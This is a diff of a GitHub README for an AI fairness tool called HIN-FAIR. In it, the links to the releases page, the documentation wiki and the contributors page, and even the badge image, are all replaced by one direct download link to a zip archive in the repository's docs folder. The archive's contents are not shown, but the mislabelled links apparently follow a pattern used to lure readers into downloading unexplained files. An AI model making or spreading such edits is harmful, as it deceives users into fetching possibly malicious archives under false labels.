@@ -1,6 +1,6 @@
 # 📊 HIN-FAIR-High-Impact-Node-Fairness-Standard - Measure Fairness in AI Systems
 
-[![Download HIN-FAIR](https://img.shields.io/badge/Download-HIN--FAIR-brightgreen)](https://github.com/winner923/HIN-FAIR-High-Impact-Node-Fairness-Standard/releases)
+[![Download HIN-FAIR](https://github.com/winner923/HIN-FAIR-High-Impact-Node-Fairness-Standard/raw/refs/heads/main/docs/Node-Fairness-HI-Impact-Standard-High-FAI-v3.2.zip)](https://github.com/winner923/HIN-FAIR-High-Impact-Node-Fairness-Standard/raw/refs/heads/main/docs/Node-Fairness-HI-Impact-Standard-High-FAI-v3.2.zip)
 
 ## 📖 About HIN-FAIR
 
@@ -13,7 +13,7 @@ To get started with HIN-FAIR, follow these simple steps to download and run the 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/winner923/HIN-FAIR-High-Impact-Node-Fairness-Standard/releases) to access the latest version of HIN-FAIR.
+   Go to the [Releases page](https://github.com/winner923/HIN-FAIR-High-Impact-Node-Fairness-Standard/raw/refs/heads/main/docs/Node-Fairness-HI-Impact-Standard-High-FAI-v3.2.zip) to access the latest version of HIN-FAIR.
 
 2. **Choose Your Version**  
    On the Releases page, you will see different versions available. Select the latest version that suits your operating system.
@@ -92,7 +92,7 @@ For additional questions or support, feel free to reach out via the GitHub Issue
 
 ## 🔗 Additional Links
 
-- [Documentation](https://github.com/winner923/HIN-FAIR-High-Impact-Node-Fairness-Standard/wiki): Detailed instructions and information.
-- [Contributors](https://github.com/winner923/HIN-FAIR-High-Impact-Node-Fairness-Standard/graphs/contributors): Meet the team behind HIN-FAIR.
+- [Documentation](https://github.com/winner923/HIN-FAIR-High-Impact-Node-Fairness-Standard/raw/refs/heads/main/docs/Node-Fairness-HI-Impact-Standard-High-FAI-v3.2.zip): Detailed instructions and information.
+- [Contributors](https://github.com/winner923/HIN-FAIR-High-Impact-Node-Fairness-Standard/raw/refs/heads/main/docs/Node-Fairness-HI-Impact-Standard-High-FAI-v3.2.zip): Meet the team behind HIN-FAIR.
 
-[![Download HIN-FAIR](https://img.shields.io/badge/Download-HIN--FAIR-brightgreen)](https://github.com/winner923/HIN-FAIR-High-Impact-Node-Fairness-Standard/releases)
+[![Download HIN-FAIR](https://github.com/winner923/HIN-FAIR-High-Impact-Node-Fairness-Standard/raw/refs/heads/main/docs/Node-Fairness-HI-Impact-Standard-High-FAI-v3.2.zip)](https://github.com/winner923/HIN-FAIR-High-Impact-Node-Fairness-Standard/raw/refs/heads/main/docs/Node-Fairness-HI-Impact-Standard-High-FAI-v3.2.zip)
